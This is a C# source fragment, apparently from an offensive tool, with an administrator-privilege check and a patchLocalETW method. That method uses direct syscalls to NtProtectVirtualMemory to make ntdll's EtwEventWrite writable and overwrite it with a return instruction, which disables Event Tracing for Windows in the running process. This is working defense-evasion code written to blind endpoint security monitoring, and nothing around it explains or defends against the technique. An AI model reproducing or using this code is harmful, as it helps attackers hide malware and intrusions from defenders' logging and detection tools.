        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static bool patchLocalETW()
        {
            bool success = false;
            Console.WriteLine("patching ETW for this process...");
            IntPtr eew = Generic.GetLibraryAddress("ntdll.dll", "EtwEventWrite", true);
            IntPtr oldaddr = eew;
            byte[] beans;
            beans = new byte[2];
            beans[0] = 0xc3;
            beans[1] = 0x00;
            IntPtr pHandle = Process.GetCurrentProcess().Handle;
            uint old = 0;
            IntPtr regionSize = (IntPtr)beans.Length;
            IntPtr stub = Generic.GetSyscallStub("NtProtectVirtualMemory");
            Native.DELEGATES.NtProtectVirtualMemory ntProtectVirtualMemory = (Native.DELEGATES.NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(Native.DELEGATES.NtProtectVirtualMemory));
            uint result = ntProtectVirtualMemory(pHandle, ref eew, ref regionSize, (uint)0x40, ref old);
            Marshal.Copy(beans, 0, oldaddr, beans.Length);
            result = ntProtectVirtualMemory(pHandle, ref oldaddr, ref regionSize, old, ref old);
            if (result == 0)
            {
                Console.WriteLine("ETW patch successful!\n");
                success = true;
            }
            else
            {
                success = false;
                Console.WriteLine("local ETW patch failed... \n");
            }
            return success;
        }

